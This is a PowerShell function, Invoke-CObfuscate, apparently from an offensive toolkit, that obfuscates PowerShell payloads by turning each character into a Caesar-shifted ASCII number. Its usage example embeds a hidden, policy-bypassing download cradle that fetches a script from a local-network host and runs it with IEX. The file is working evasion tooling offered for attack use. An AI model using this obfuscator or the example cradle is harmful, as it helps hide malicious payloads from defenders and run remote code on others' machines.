function Invoke-CObfuscate
{
<#
.SYNOPSIS

Obfuscates Powershell payload.
Author: Mamadou Lamine NIANG (@mlniang)
License: BSD 3-Clause  
Required Dependencies: None  
Optional Dependencies: None

.DESCRIPTION

Transforms every character to a ceasar shifted number following it's ASCII code

.PARAMETER Payload

Specifies the payload to obfuscate

.PARAMETER Shift

Specifies the shift to apply

.EXAMPLE

C:\PS> Invoke-CObfuscate -Shift 17 -Payload "PowerShell -exec Bypass -nop -w hidden -c IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.1.2/f.txt'))"

.LINK
https://github.com/mlniang/Mist/Powershell
#>

    [CmdletBinding()]
    param(
        [ValidateNotNullOrEmpty()]
        [String]
        $Payload,

        [ValidateNotNullOrEmpty()]
        [UInt32]
        $Shift
    )

    $output = ""

    $Payload.ToCharArray() | %{
        [string]$c = [byte][char]$_ + $Shift
        if($c.Length -eq 1)
        {
            $c = [string]"00" + $c
            $output += $c
        }
        elseif($c.Length -eq 2)
        {
            $c = [string]"0" + $c
            $output += $c
        }
        elseif($c.Length -eq 3)
        {
            $output += $c
        }
    }

    Write-Host "$output"

}